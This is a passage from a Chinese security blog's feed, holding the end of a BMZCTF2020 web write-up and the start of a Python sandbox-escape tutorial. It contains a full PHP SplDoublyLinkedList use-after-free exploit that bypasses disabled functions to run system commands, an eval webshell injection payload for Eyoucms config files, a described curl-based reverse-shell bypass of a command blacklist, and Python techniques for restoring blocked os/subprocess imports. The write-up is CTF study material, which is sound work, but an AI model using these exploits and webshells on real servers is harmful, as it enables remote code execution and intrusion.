class="number">0x08</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trigger</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $s;</span><br><span class="line">        <span class="keyword">unset</span>($s[<span class="number">0</span>]);</span><br><span class="line">        $a = str_shuffle(str_repeat(<span class="string">&quot;T&quot;</span>, <span class="number">0xf</span>));</span><br><span class="line">        i2s($a, <span class="number">0x00</span>, <span class="number">0x1234567812345678</span>);</span><br><span class="line">        i2s($a, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">7</span>);</span><br><span class="line">        $s -&gt; current();</span><br><span class="line">        $s -&gt; next();</span><br><span class="line">        <span class="keyword">if</span> ($s -&gt; current() !== <span class="number">0x1234567812345678</span>) &#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;[!]UAF Failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $maps = file_get_contents(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!$maps) &#123;</span><br><span class="line">            cantRead($a);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            canRead($maps, $a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[+]Done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass</span>(<span class="params">$elementAddress, &amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    <span class="keyword">if</span> (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get Closure Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $closure_object = leak($a, $closureChunkAddress + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Object: &quot;</span> . dechex($closure_object) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    $closure_handlers = leak($a, $closure_object + <span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Handler: &quot;</span> . dechex($closure_handlers) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!($system_address = getSystem($a, $closure_handlers))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Couldn&#x27;t determine system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Find system&#x27;s handler: &quot;</span> . dechex($system_address) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x506</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; (<span class="number">0x130</span> / <span class="number">0x08</span>);$i++) &#123;</span><br><span class="line">        $data = leak($a, $closure_object + <span class="number">0x08</span> * $i);</span><br><span class="line">        i2s($a, <span class="number">0x00</span>, $closure_object + <span class="number">0x30</span>);</span><br><span class="line">        i2s($s -&gt; current(), <span class="number">0x08</span> * $i + <span class="number">0x100</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $closure_object + <span class="number">0x30</span>);</span><br><span class="line">    i2s($s -&gt; current(), <span class="number">0x20</span>, $system_address);</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $closure_object);</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x108</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Executing command: \n&quot;</span>;</span><br><span class="line">    ($s -&gt; current())(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">canRead</span>(<span class="params">$maps, &amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    <span class="keyword">if</span> (!$chunkAddress = getPHPChunk($maps)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get PHP Chunk Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$elementAddress = getElement($a, $chunkAddress)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bypass($elementAddress, $a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cantRead</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    i2s($a, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&quot;test1&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_GET[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Please try to get address of PHP Chunk&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;test1&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(dechex(bomb1($a)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;test2&quot;</span>])) &#123;</span><br><span class="line">        $elementAddress = bomb2($a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$elementAddress) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bypass($elementAddress, $a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> <span class="built_in">SplDoublyLinkedList</span>();</span><br><span class="line">$s -&gt; push(<span class="keyword">new</span> Trigger());</span><br><span class="line">$s -&gt; push(<span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">$s -&gt; push(<span class="function"><span class="keyword">function</span>(<span class="params">$x</span>)</span>&#123;&#125;);</span><br><span class="line"><span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; <span class="number">0x100</span>;$x++) &#123;</span><br><span class="line">    $s -&gt; push(<span class="number">0x1234567812345678</span>);</span><br><span class="line">&#125;</span><br><span class="line">$s -&gt; rewind();</span><br><span class="line"><span class="keyword">unset</span>($s[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>先用蚁剑连接：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191719.png" alt=""></p><p>再上传至/tmp目录下：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191807.png" alt=""></p><p>include包含exp.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230191837.png" alt=""></p><h2 id="0x03-penetration">0x03 penetration</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">    $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    $_=<span class="keyword">array</span>(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\:&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\@&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;\!&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&#125;&#x27;</span>,<span class="string">&#x27;\&#123;&#x27;</span>,<span class="string">&#x27;\_&#x27;</span>);</span><br><span class="line">    $blacklist = array_merge($_);</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen($ip) &lt;= <span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $ip)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            exec($ip);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;long&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤之后还剩下这些字符可以使用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># $ , &#x2F; ; ? \ &#96; | a c h l r s t u v y z 0 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure><p>由于exec没有回显，应该要使用反弹shell，但是有字数长度限制，这里需要用curl命令读取远程文件绕过一下，而且要把ip地址转换成十进制表示，不知道是我的阿里云站点配置有问题还是怎么回事，我用curl命令+ip地址返回200，但是curl+十进制ip地址就直接给我返回301了，但是我看了宝塔的配置，也没有启用301重定向。</p><p>有知道原因的时候师傅可以告知我一下。</p><h2 id="0x04-BMZ-Market">0x04 BMZ_Market</h2><p>综合渗透类型，有点像HackTheBox。</p><p>首先进行信息搜集，查看源代码：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131109.png" alt=""></p><p>robots.txt</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131154.png" alt=""></p><p>一共搜集到两个地方，参数lang和robots.txt</p><p>参数lang存在文件包含漏洞，使用伪协议可以读取源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password =<span class="string">&quot;Nevergiveup135.&quot;</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">&#x27;lang&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;BMZ Market&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;author&quot;</span> content=<span class="string">&quot;bmz&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;BMZ Market&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=<span class="string">&quot;bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    &lt;link href=<span class="string">&quot;covers.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body class=&quot;text-center&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;masthead mb-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;h3 class=&quot;masthead-brand&quot;&gt;BMZ Market&lt;/h3&gt;</span><br><span class="line">          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;</span><br><span class="line">            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;</span><br><span class="line">            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span><br><span class="line">          &lt;/nav&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;</span><br><span class="line">        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">          &#123;</span><br><span class="line">          <span class="keyword">echo</span> $message;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">            Believe in yourself, you can find the flag</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">          &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;more&lt;/a&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line"></span><br><span class="line">      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;p&gt;Power by&lt;a href=<span class="string">&quot;#&quot;</span>&gt;@kuaile&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/footer&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>有一个密码硬编码的地方：<code>Nevergiveup135.</code>，用户名可能是kuaile</p><p>robots.txt拿去base64 decode：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131506.png" alt=""></p><p>发现是颜文字，可以直接拿到浏览器的console界面执行</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131609.png" alt=""></p><p>又给了一个信息：<code>Challenger, the background of the website is -.../--/--../.-/-../--/../-.</code></p><p>后面是一个摩斯编码，解码后的结果是:<code>BMZADMIN</code>，看样子应该是一个后台管理界面，用上面得到的用户名和密码登录进入后台。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131827.png" alt=""></p><p>可以看到当前的CMS版本是1.3.7，Google已知的利用方式：<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Eyoucms/Eyoucms%201.3.9%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">https://wiki.96.mk/Web安全/Eyoucms/Eyoucms 1.3.9 上传漏洞/</a></p><p>这种利用方式好像打不通，参考mochu师傅的wp</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103154407.png" alt=""></p><p>抓包修改参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;scene&#x3D;bbb\&#39;,$&#123;eval($_POST[mochu7])&#125;,&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103154643.png" alt=""></p><p>蚁剑连接，sudo -l发现可以无限制执行root命令：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103155216.png" alt=""></p><p>再回头来看看后台上传文件RCE失效的原因：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103155327.png" alt=""></p><p>可能是作者把解压的类文件给删掉了。</p><p>来大概跟一下这个漏洞，文件位置在application/admin/controllor/Weapp.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103165020.png" alt=""></p><p>由于过滤不严，直接把payload写到config.php文件当中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103164941.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103165136.png" alt=""></p><p>然后在core/library/think/App.php中包含了config.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103170458.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BMZCTF2020-Web-WriteUp&quot;&gt;BMZCTF2020 Web WriteUp&lt;/h1&gt;
&lt;h2 id=&quot;0x01-easyeval&quot;&gt;0x01 easyeval&lt;/h2&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="http://ca0y1h.top/Python/pysec/2.Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>http://ca0y1h.top/Python/pysec/2.Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2021-01-03T02:53:44.000Z</published>
    <updated>2021-01-03T02:54:29.541Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python沙箱逃逸">Python沙箱逃逸</h1><p>上一篇写到了关于python flask SSTI的总结文章，看了沙箱逃逸之后，发现这两者的方法和payload很相似，所以把python的沙箱逃逸和服务端模板注入放在一起总结。</p><h2 id="0x01-基础知识">0x01 基础知识</h2><p>沙箱：沙箱是一种按照安全策略限制程序行为的执行环境。</p><p>沙箱逃逸：就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。</p><p>先来给上一道例题源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span>)</span><br><span class="line">banned = [<span class="string">&quot;import&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;pickle&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>, <span class="string">&quot;kevin sucks&quot;</span>, <span class="string">&quot;input&quot;</span>, <span class="string">&quot;banned&quot;</span>, <span class="string">&quot;cry sum more&quot;</span>, <span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">&#x27;raw_input&#x27;</span>)</span><br><span class="line">targets.remove(<span class="string">&#x27;print&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    data = input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">&quot;No bueno&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># this means nobreak</span></span><br><span class="line">            exec(data)</span><br></pre></td></tr></table></figure><p>一般而言沙箱逃逸的题目考到的知识点无非下面5个：</p><ul><li>python的导包</li><li>python执行代码和命令</li><li>python文件读取</li><li>内置模块</li><li>对象创建于引用</li></ul><p>那么与之相对应的解题思路大致分为5步：</p><ol><li>测试能否导包</li><li>哪些系统包做了限制</li><li>内置函数是否可用</li><li>静态检测or动态检测</li><li>对象之间的引用关系索引</li></ol><h2 id="0x02-花式导包">0x02 花式导包</h2><p>如果我们想在沙箱中getshell的话，必不可少的是要引入Python中执行命令的包，例如os,sys,subprocess等。</p><p>有些沙箱使用比较初级的办法，通过正则对输入代码内容进行过滤，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = open(<span class="string">&#x27;code.py&#x27;</span>).read()</span><br><span class="line">pattern  = re.compile(<span class="string">&#x27;import\s+(os|commands|subprocess|sys)&#x27;</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;forbidden module import detected&quot;</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure><p>这个时候，我们突破这种封锁，首先要学习的是Python的各种导包方法。</p><h3 id="初阶">初阶</h3><p>一般比较常见的是以下几种方法：</p><ul><li>import xxx</li><li>from xxx import *</li><li>_<em>import</em>_(“xxx”)</li><li>importlib库</li><li>imp 库</li><li>reload(xxx)</li></ul><p>第一个和第二个比较熟悉，不用过多赘述，<code>__import__</code>作为一个函数，只能接受字符串参数，返回值可以直接用来操作，通常在动态加载的时候使用这个函数，python2和python3通用：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161327.png" alt=""></p><p>importlib模块是对import和<code>__import__</code>的补充，它也可以通过传入字符串来引入一个模块，python2和python3使用方法一样：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161631.png" alt=""></p><p>imp库的使用方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161942.png" alt=""></p><p>reload 的用法比较有意思，假如沙箱导入了os模块，但是删除了system方法,强行使用system执行命令会报错:<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162046.png" alt=""></p><p>而我又想用system方法执行命令的话，可以使用reload重新加载os模块，恢复对system方法的引用。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162126.png" alt=""></p><h3 id="高阶">高阶</h3><p>导包说到本质上其实是python 读取指定包的py文件，并将其加载到解释器的过程。在模块导入的时候，默认在当前目录下查找，然后再在系统中查找，系统查找的范围是<code>sys.path</code>下的所有路径。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162508.png" alt=""></p><p>我使用的是Anaconda管理python版本，在一些常见的Linux发行版本上，路径一般都是在<code>/usr/lib/python3.X</code>目录下。</p><p>因此我们可以直接执行对应包的文件，从而实现包的导入。在py2中有execfile这个函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162944.png" alt=""></p><p>在python3中没有execfile这个函数，但是又exec，可以通过读文件交给exec执行的方式导入包：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163247.png" alt=""></p><p>上面说到导包的本质是python读取指定的文件，import的本质是：搜索modules并绑定到局部变量</p><p><code>import module_name</code>实质是将<code>module_name.py</code>中的全部代码加载到内存并赋值给与模块同名的变量写在当前文件中，这个变量的类型是<code>module</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163713.png" alt=""></p><p>现在设置一下modules中<code>os</code>的值为None：</p><p><img 